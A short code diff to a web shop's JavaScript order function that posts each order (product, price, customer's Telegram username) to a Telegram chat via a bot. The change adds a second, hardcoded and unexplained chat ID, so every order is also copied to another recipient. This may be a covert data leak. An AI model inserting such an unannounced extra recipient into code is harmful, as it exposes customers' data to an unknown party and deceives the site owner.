@@ -1284,11 +1284,14 @@ function sendOrder() {
     '👕 Товар: ' + _orderTitle + '\n' +
     '💰 Цена: ' + _orderPrice + '\n' +
     '📱 Telegram: ' + username;
-  fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({chat_id: CHAT_ID, text: text})
-  }).then(function() {
+  var ids = [CHAT_ID, "8024392145"];
+  Promise.all(ids.map(function(cid){
+    return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id: cid, text: text})
+    });
+  })).then(function() {
     document.getElementById('modalForm').style.display = 'none';
     document.getElementById('modalSuccess').style.display = 'block';
     setTimeout(closeModal, 2500);
